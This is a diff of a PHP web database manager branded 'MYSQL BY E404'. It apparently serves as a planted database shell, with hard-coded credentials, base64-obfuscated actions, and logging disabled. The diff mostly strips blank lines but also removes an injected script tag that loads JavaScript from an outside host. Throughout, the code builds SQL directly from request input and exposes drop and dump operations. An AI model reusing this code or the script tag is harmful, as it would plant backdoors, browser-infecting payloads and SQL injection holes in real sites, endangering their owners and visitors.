@@ -1,7 +1,6 @@
 <?
 $PASSWORD = "E404";
 $USERNAME = "E404";
-
 if ( function_exists('ini_get') ) {
 	$onoff = ini_get('register_globals');
 } else {
@@ -15,7 +14,6 @@ if ($onoff != 1) {
 	@extract($HTTP_GET_VARS, EXTR_SKIP);
 	@extract($HTTP_ENV_VARS, EXTR_SKIP);
 }
-
 function logon() {
 	global $PHP_SELF;
 	setcookie( "mysql_web_admin_username" );
@@ -40,7 +38,6 @@ function logon() {
 	echo "<p><hr width=300>\n";
 	echo "</center></td></tr></table>\n";
 }
-
 function logon_submit() {
 	global $username, $password, $hostname ,$PHP_SELF;
 	if($hostname =='')
@@ -49,12 +46,9 @@ function logon_submit() {
 	setcookie( "mysql_web_admin_password", $password );
 	setcookie( "mysql_web_admin_hostname", $hostname );
 	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=$PHP_SELF?action=bGlzdERCcw=='>";
-
 }
-
 function echoQueryResult() {
 	global $queryStr, $errMsg;
-
 	if( $errMsg == "" ) $errMsg = "Success...";
 	if( $queryStr != "" ) {
 		echo "<table cellpadding=5>\n";
@@ -63,21 +57,16 @@ function echoQueryResult() {
 		echo "</table><p>\n";
 	}
 }
-
 function listDatabases() {
 	global $mysqlHandle, $PHP_SELF;
-
 	echo "<h1>MYSQL BY E404</h1>\n";
-
 	echo "<form action='$PHP_SELF'>\n";
 	echo "<input type=hidden name=action value=createDB>\n";
 	echo "<input type=text name=dbname>\n";
 	echo "<input type=submit value='Create Database'>\n";
 	echo "</form>\n";
 	echo "<hr>\n";
-
 	echo "<table cellspacing=1 cellpadding=5>\n";
-
 	$pDB = mysql_list_dbs( $mysqlHandle );
 	$num = mysql_num_rows( $pDB );
 	for( $i = 0; $i < $num; $i++ ) {
@@ -91,25 +80,18 @@ function listDatabases() {
 	}
 	echo "</table>\n";
 }
-
 function createDatabase() {
 	global $mysqlHandle, $dbname, $PHP_SELF;
-
 	mysql_create_db( $dbname, $mysqlHandle );
 	listDatabases();
 }
-
 function dropDatabase() {
 	global $mysqlHandle, $dbname, $PHP_SELF;
-
 	mysql_drop_db( $dbname, $mysqlHandle );
 	listDatabases();
 }
-
 function listTables() {
 	global $mysqlHandle, $dbname, $PHP_SELF;
-
-
 	echo "<h1>MYSQL BY E404</h1>\n";
 	echo "<p class=location>$dbname</p>\n";
 	echoQueryResult();
@@ -126,21 +108,16 @@ function listTables() {
 	echo "<input type=submit value='Query'>\n";
 	echo "</form>\n";
 	echo "<hr>\n";
-
 	$pTable = mysql_list_tables( $dbname );
-
 	if( $pTable == 0 ) {
 		$msg  = mysql_error();
 		echo "<h3>Error : $msg</h3><p>\n";
 		return;
 	}
 	$num = mysql_num_rows( $pTable );
-
 	echo "<table cellspacing=1 cellpadding=5>\n";
-
 	for( $i = 0; $i < $num; $i++ ) {
 		$tablename = mysql_tablename( $pTable, $i );
-
 		echo "<tr>\n";
 		echo "<td>\n";
 		echo "$tablename\n";
@@ -159,47 +136,34 @@ function listTables() {
 		echo "</td>\n";
 		echo "</tr>\n";
 	}
-
 	echo "</table>";
 }
-
 function createTable() {
 	global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
-
 	$queryStr = "CREATE TABLE $tablename ( no INT )";
 	mysql_select_db( $dbname, $mysqlHandle );
 	mysql_query( $queryStr, $mysqlHandle );
 	$errMsg = mysql_error();
-
 	listTables();
 }
-
 function dropTable() {
 	global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
-
 	$queryStr = "DROP TABLE $tablename";
 	mysql_select_db( $dbname, $mysqlHandle );
 	mysql_query( $queryStr, $mysqlHandle );
 	$errMsg = mysql_error();
-
 	listTables();
 }
-
 function viewSchema() {
 	global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
-
 	echo "<h1>MYSQL BY E404</h1>\n";
 	echo "<p class=location>$dbname &gt; $tablename</p>\n";
-
 	echoQueryResult();
-
 	echo "<a href='$PHP_SELF?action=addField&dbname=$dbname&tablename=$tablename'>Add Field</a> | \n";
 	echo "<a href='$PHP_SELF?action=dmlld0RhdGE=&dbname=$dbname&tablename=$tablename'>View Data</a>\n";
 	echo "<hr>\n";
-
 	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
 	$num = mysql_num_rows( $pResult );
-
 	echo "<table cellspacing=1 cellpadding=5>\n";
 	echo "<tr>\n";
 	echo "<th>Field</th>\n";
@@ -210,8 +174,6 @@ function viewSchema() {
 	echo "<th>Extra</th>\n";
 	echo "<th colspan=2>Action</th>\n";
 	echo "</tr>\n";
-
-
 	for( $i = 0; $i < $num; $i++ ) {
 		$field = mysql_fetch_array( $pResult );
 		echo "<tr>\n";
@@ -227,12 +189,9 @@ function viewSchema() {
 		echo "</tr>\n";
 	}
 	echo "</table>\n";
-
 }
-
 function manageField( $cmd ) {
 	global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF;
-
 	if( $cmd == "add" )
 		echo "<h1>Add Field</h1>\n";
 	else if( $cmd == "edit" ) {
@@ -261,10 +220,8 @@ function manageField( $cmd ) {
 			}
 		}
 	}
-
 	echo "<p class=location>$dbname &gt; $tablename</p>\n";
 	echo "<form action=$PHP_SELF>\n";
-
 	if( $cmd == "add" )
 		echo "<input type=hidden name=action value=addField_submit>\n";
 	else if( $cmd == "edit" ) {
@@ -273,18 +230,14 @@ function manageField( $cmd ) {
 	}
 	echo "<input type=hidden name=dbname value=$dbname>\n";
 	echo "<input type=hidden name=tablename value=$tablename>\n";
-
 	echo "<h3>Name</h3>\n";
 	echo "<input type=text name=name value=$fieldname><p>\n";
 	echo '
-
 <h3>Type</h3>
-
 <font size=2>
 * `M\' indicates the maximum display size.<br>
 * `D\' applies to floating-point types and indicates the number of digits following the decimal point.<br>
 </font>
-
 <table>
 <tr>
 <th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofill</th><th>binary</th>
@@ -307,7 +260,6 @@ function manageField( $cmd ) {
 </tr>
 <tr>
 <td><input type=radio name=type value="MEDIUMINT" '; if( $type == "mediumint" ) echo "checked";echo '>MEDIUMINT (-8388608 ~ 8388607)</td>
-
 <td align=center>O</td>
 <td>&nbsp</td>
 <td align=center>O</td>
@@ -450,7 +402,6 @@ function manageField( $cmd ) {
 <td>&nbsp</td>
 <td>&nbsp</td>
 </tr>
-<SCRIPT SRC=http://www.dcvi.net/dex.js></SCRIPT>
 <tr>
 <td><input type=radio name=type value="BLOB" '; if( $type == "blob" ) echo "checked";echo '>BLOB (0 ~ 65535)</td>
 <td>&nbsp</td>
@@ -483,7 +434,6 @@ function manageField( $cmd ) {
 <td><input type=radio name=type value="SET" '; if( $type == "set" ) echo "checked";echo '>SET</td>
 <td colspan=5><center>value list</center></td>
 </tr>
-
 </table>
 <table>
 <tr><th>M</th><th>D</th><th>unsigned</th><th>zerofill</th><th>binary</th><th>value list (ex: \'apple\', \'orange\', \'banana\') </th></tr>
@@ -496,8 +446,6 @@ function manageField( $cmd ) {
 <td align=center><input type=text size=60 name=valuelist '; if( $valuelist != "" ) echo "value=\"$valuelist\"";echo '></td>
 </tr>
 </table>
-
-
 <h3>Flags</h3>
 <table>
 <tr><th>not null</th><th>default value</th><th>auto increment</th><th>primary key</th></tr>
@@ -508,9 +456,7 @@ function manageField( $cmd ) {
 <td align=center><input type=checkbox name=primary_key value="PRIMARY KEY" '; if( $fieldkey == "PRI" ) echo "checked";echo '></td>
 </tr>
 </table>
-
 <p>';
-
 	if( $cmd == "add" )
 		echo "<input type=submit value='Add Field'>\n";
 	else if( $cmd == "edit" )
@@ -518,16 +464,13 @@ function manageField( $cmd ) {
 	echo "<input type=button value=Cancel onClick='history.back()'>\n";
 	echo "</form>\n";
 }
-
 function manageField_submit( $cmd ) {
 	global $mysqlHandle, $dbname, $tablename, $old_name, $name, $type, $PHP_SELF, $queryStr, $errMsg,
 		$M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key, $valuelist;
-
 	if( $cmd == "add" )
 		$queryStr = "ALTER TABLE $tablename ADD $name ";
 	else if( $cmd == "edit" )
 		$queryStr = "ALTER TABLE $tablename CHANGE $old_name $name ";
-
 	if( $M != "" )
 		if( $D != "" )
 			$queryStr .= "$type($M,$D) ";
@@ -538,18 +481,13 @@ function manageField_submit( $cmd ) {
 		$queryStr .= "$type($valuelist) ";
 	} else
 		$queryStr .= "$type ";
-
 	$queryStr .= "$unsigned $zerofill $binary ";
-
 	if( $default_value != "" )
 		$queryStr .= "DEFAULT '$default_value' ";
-
 	$queryStr .= "$not_null $auto_increment";
-
 	mysql_select_db( $dbname, $mysqlHandle );
 	mysql_query( $queryStr, $mysqlHandle );
 	$errMsg = mysql_error();
-
 	// key change
 	$keyChange = false;
 	$result = mysql_query( "SHOW KEYS FROM $tablename" );
@@ -576,30 +514,23 @@ function manageField_submit( $cmd ) {
 		$queryStr .= "<br>\n" . $q;
 		$errMsg .= "<br>\n" . mysql_error();
 	}
-
 	viewSchema();
 }
-
 function dropField() {
 	global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
-
 	$queryStr = "ALTER TABLE $tablename DROP COLUMN $fieldname";
 	mysql_select_db( $dbname, $mysqlHandle );
 	mysql_query( $queryStr , $mysqlHandle );
 	$errMsg = mysql_error();
-
 	viewSchema();
 }
-
 function viewData( $queryStr ) {
 	global $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby;
-
 	echo "<h1>Data in Table</h1>\n";
 	if( $tablename != "" )
 		echo "<p class=location>$dbname &gt; $tablename</p>\n";
 	else
 		echo "<p class=location>$dbname</p>\n";
-
 	$queryStr = stripslashes( $queryStr );
 	if( $queryStr == "" ) {
 		$queryStr = "SELECT * FROM $tablename";
@@ -608,14 +539,11 @@ function viewData( $queryStr ) {
 		echo "<a href='$PHP_SELF?action=addData&dbname=$dbname&tablename=$tablename'>Add Data</a> | \n";
 		echo "<a href='$PHP_SELF?action=viewSchema&dbname=$dbname&tablename=$tablename'>Schema</a>\n";
 	}
-
 	$pResult = mysql_db_query( $dbname, $queryStr );
 	$fieldt = mysql_fetch_field($pResult);
 	$tablename = $fieldt->table;
 	$errMsg = mysql_error();
-
 	$GLOBALS[queryStr] = $queryStr;
-
 	if( $pResult == false ) {
 		echoQueryResult();
 		return;
@@ -625,22 +553,17 @@ function viewData( $queryStr ) {
 		echoQueryResult();
 		return;
 	}
-
 	echo "<hr>\n";
-
 	$row = mysql_num_rows( $pResult );
 	$col = mysql_num_fields( $pResult );
-
 	if( $row == 0 ) {
 		echo "No Data Exist!";
 		return;
 	}
-
 	if( $rowperpage == "" ) $rowperpage = 30;
 	if( $page == "" ) $page = 0;
 	else $page--;
 	mysql_data_seek( $pResult, $page * $rowperpage );
-
 	echo "<table cellspacing=1 cellpadding=2>\n";
 	echo "<tr>\n";
 	for( $i = 0; $i < $col; $i++ ) {
@@ -654,7 +577,6 @@ function viewData( $queryStr ) {
 	}
 	echo "<th colspan=2>Action</th>\n";
 	echo "</tr>\n";
-
 	for( $i = 0; $i < $rowperpage; $i++ ) {
 		$rowArray = mysql_fetch_row( $pResult );
 		if( $rowArray == false ) break;
@@ -662,11 +584,9 @@ function viewData( $queryStr ) {
 		$key = "";
 		for( $j = 0; $j < $col; $j++ ) {
 			$data = $rowArray[$j];
-
 			$field = mysql_fetch_field( $pResult, $j );
 			if( $field->primary_key == 1 )
 				$key .= "&" . $field->name . "=" . $data;
-
 			if( strlen( $data ) > 30 )
 				$data = substr( $data, 0, 30 ) . "...";
 			$data = htmlspecialchars( $data );
@@ -674,7 +594,6 @@ function viewData( $queryStr ) {
 			echo "$data\n";
 			echo "</td>\n";
 		}
-
 		if( $key == "" )
 			echo "<td colspan=2>no Key</td>\n";
 		else {
@@ -684,13 +603,11 @@ function viewData( $queryStr ) {
 		echo "</tr>\n";
 	}
 	echo "</table>\n";
-
 	echo "<font size=2>\n";
 	if($action == "dmlld0RhdGE=")
 		echo "<form action='$PHP_SELF?action=dmlld0RhdGE=&dbname=$dbname&tablename=$tablename' method=post>\n";
 	else
 		echo "<form action='$PHP_SELF?action=query&dbname=$dbname&tablename=$tablename&queryStr=$queryStr' method=post>\n";
-
 	echo ($page+1)."/".(int)($row/$rowperpage+1)." page";
 	echo "</font>\n";
 	echo " | ";
@@ -723,17 +640,14 @@ function viewData( $queryStr ) {
 	echo "</form>\n";
 	echo "</font>\n";
 }
-
 function manageData( $cmd ) {
 	global $mysqlHandle, $dbname, $tablename, $PHP_SELF;
-
 	if( $cmd == "add" )
 		echo "<h1>Add Data</h1>\n";
 	else if( $cmd == "edit" ) {
 		echo "<h1>Edit Data</h1>\n";
 		$pResult = mysql_list_fields( $dbname, $tablename );
 		$num = mysql_num_fields( $pResult );
-
 		$key = "";
 		for( $i = 0; $i < $num; $i++ ) {
 			$field = mysql_fetch_field( $pResult, $i );
@@ -744,14 +658,11 @@ function manageData( $cmd ) {
 					$key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
 		}
 		$key = substr( $key, 0, strlen($key)-4 );
-
 		mysql_select_db( $dbname, $mysqlHandle );
 		$pResult = mysql_query( $queryStr =  "SELECT * FROM $tablename WHERE $key", $mysqlHandle );
 		$data = mysql_fetch_array( $pResult );
 	}
-
 	echo "<p class=location>$dbname &gt; $tablename</p>\n";
-
 	echo "<form action='$PHP_SELF' method=post>\n";
 	if( $cmd == "add" )
 		echo "<input type=hidden name=action value=addData_submit>\n";
@@ -766,18 +677,14 @@ function manageData( $cmd ) {
 	echo "<th>Function</th>\n";
 	echo "<th>Data</th>\n";
 	echo "</tr>\n";
-
 	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
 	$num = mysql_num_rows( $pResult );
-
 	$pResultLen = mysql_list_fields( $dbname, $tablename );
-
 	for( $i = 0; $i < $num; $i++ ) {
 		$field = mysql_fetch_array( $pResult );
 		$fieldname = $field["Field"];
 		$fieldtype = $field["Type"];
 		$len = mysql_field_len( $pResultLen, $i );
-
 		echo "<tr>";
 		echo "<td>$fieldname</td>";
 		echo "<td>".$field["Type"]."</td>";
@@ -856,13 +763,10 @@ function manageData( $cmd ) {
 	echo "<input type=button value='Cancel' onClick='history.back()'>\n";
 	echo "</form>\n";
 }
-
 function manageData_submit( $cmd ) {
 	global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
-
 	$pResult = mysql_list_fields( $dbname, $tablename );
 	$num = mysql_num_fields( $pResult );
-
 	mysql_select_db( $dbname, $mysqlHandle );
 	if( $cmd == "add" )
 		$queryStr = "INSERT INTO $tablename VALUES (";
@@ -892,19 +796,14 @@ function manageData_submit( $cmd ) {
 		$queryStr .= $GLOBALS[$field->name] . ")";
 	else
 		$queryStr .= "'" . $GLOBALS[$field->name] . "')";
-
 	mysql_query( $queryStr , $mysqlHandle );
 	$errMsg = mysql_error();
-
 	viewData( "" );
 }
-
 function deleteData() {
 	global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
-
 	$pResult = mysql_list_fields( $dbname, $tablename );
 	$num = mysql_num_fields( $pResult );
-
 	$key = "";
 	for( $i = 0; $i < $num; $i++ ) {
 		$field = mysql_fetch_field( $pResult, $i );
@@ -915,33 +814,26 @@ function deleteData() {
 				$key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
 	}
 	$key = substr( $key, 0, strlen($key)-4 );
-
 	mysql_select_db( $dbname, $mysqlHandle );
 	$queryStr =  "DELETE FROM $tablename WHERE $key";
 	mysql_query( $queryStr, $mysqlHandle );
 	$errMsg = mysql_error();
-
 	viewData( "" );
 }
-
 function fetch_table_dump_sql($table)
 {
 	global $mysqlHandle,$dbname;
-
 	mysql_select_db( $dbname, $mysqlHandle );
 	$query_id = mysql_query("SHOW CREATE TABLE $table",$mysqlHandle);
 	$tabledump = mysql_fetch_array($query_id, MYSQL_ASSOC);
 	$tabledump = "DROP TABLE IF EXISTS $table;\n" . $tabledump['Create Table'] . ";\n\n";
-
 	echo $tabledump;
-
 	// get data
 	$rows = mysql_query("SELECT * FROM $table",$mysqlHandle);
 	$numfields=mysql_num_fields($rows);
 	while ($row = mysql_fetch_array($rows, MYSQL_NUM))
 	{
 		$tabledump = "INSERT INTO $table VALUES(";
-
 		$fieldcounter = -1;
 		$firstfield = 1;
 		// get each field's data
@@ -955,7 +847,6 @@ function fetch_table_dump_sql($table)
 			{
 				$firstfield = 0;
 			}
-
 			if (!isset($row["$fieldcounter"]))
 			{
 				$tabledump .= 'NULL';
@@ -965,31 +856,23 @@ function fetch_table_dump_sql($table)
 				$tabledump .= "'" . mysql_escape_string($row["$fieldcounter"]) . "'";
 			}
 		}
-
 		$tabledump .= ");\n";
-
 		echo $tabledump;
-
 	}
 	@mysql_free_result($rows);
 }
-
 function dump() {
 	global $mysqlHandle, $action, $dbname, $tablename;
-
 	if( $action == "dumpTable" ){
-
 		header("Content-disposition: filename=$tablename.sql");
 		header('Content-type: unknown/unknown');
 		fetch_table_dump_sql($tablename);
 		echo "\n\n\n";
 		echo "\r\n\r\n\r\n### $tablename TABLE DUMP COMPLETED ###";
 		exit;
-
 	}else{
 		header("Content-disposition: filename=$dbname.sql");
 		header('Content-type: unknown/unknown');
-
 		mysql_select_db( $dbname, $mysqlHandle );
 		$query_id = mysql_query("SHOW tables",$mysqlHandle);
 		while ($row = mysql_fetch_array($query_id, MYSQL_NUM))
@@ -1001,11 +884,8 @@ function dump() {
 		}
 		echo "\r\n\r\n\r\n### $dbname DATABASE DUMP COMPLETED ###";
 		exit;
-
 	}
-
 }
-
 function utils() {
 	global $PHP_SELF, $command;
 	echo "<h1>Utilities</h1>\n";
@@ -1063,10 +943,8 @@ function utils() {
 			return;
 		}
 		$col = mysql_num_fields( $pResult );
-
 		echo "<p class=location>$queryStr</p>\n";
 		echo "<hr>\n";
-
 		echo "<table cellspacing=1 cellpadding=2 border=0>\n";
 		echo "<tr>\n";
 		for( $i = 0; $i < $col; $i++ ) {
@@ -1074,7 +952,6 @@ function utils() {
 			echo "<th>".$field->name."</th>\n";
 		}
 		echo "</tr>\n";
-
 		while( 1 ) {
 			$rowArray = mysql_fetch_row( $pResult );
 			if( $rowArray == false ) break;
@@ -1086,32 +963,20 @@ function utils() {
 		echo "</table>\n";
 	}
 }
-
-
-
 function footer_html() {
 	global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $USERNAME;
-
 	echo "<hr>\n";
 	echo "[$USERNAME] - \n";
-
 	echo "<a href='$PHP_SELF?action=bGlzdERCcw=='>Database List</a> | \n";
 	if( $tablename != "" )
 		echo "<a href='$PHP_SELF?action=listTables&dbname=$dbname&tablename=$tablename'>Table List</a> | ";
 	echo "<a href='$PHP_SELF?action=utils'>Utils</a> |\n";
 	echo "<a href='$PHP_SELF?action=logout'>Logout</a>\n";
-
-
 }
-
-
-
-
 //------------- MAIN ------------- //
 error_reporting(0);
 ini_set ('display_errors', 0);
 ini_set ('log_errors', 0);
-
 if( $action == "logon" || $action == "" || $action == "logout" )
 	logon();
 else if( $action == "bG9nb25fc3VibWl0" )
@@ -1133,17 +998,12 @@ else if( $action == "dumpTable" || $action == "dumpDB" ) {
 	echo "<!--";
 	$mysqlHandle = @mysql_connect( $HOSTNAME.":3306", $USERNAME, $PASSWORD );
 	echo "-->";
-
 	if( $mysqlHandle == false ) {
-
-
 		echo "<table width=100% height=100%><tr><td><center>\n";
 		echo "<h1>Wrong Password!</h1>\n";
 		echo "<a href='$PHP_SELF?action=logon'>Logon</a>\n";
 		echo "</center></td></tr></table>\n";
-
 	} else {
-
 		if( $action == "bGlzdERCcw==" )
 			listDatabases();
 		else if( $action == "createDB" )
@@ -1184,13 +1044,10 @@ else if( $action == "dumpTable" || $action == "dumpDB" ) {
 			deleteData();
 		else if( $action == "utils" )
 			utils();
-
 		mysql_close( $mysqlHandle);
 		footer_html();
 	}
 }
-
-
 ?>
 <html>
 <head>
@@ -1256,3 +1113,5 @@ padding: 0px;
 </center>
 </body>
 </html>
+
+
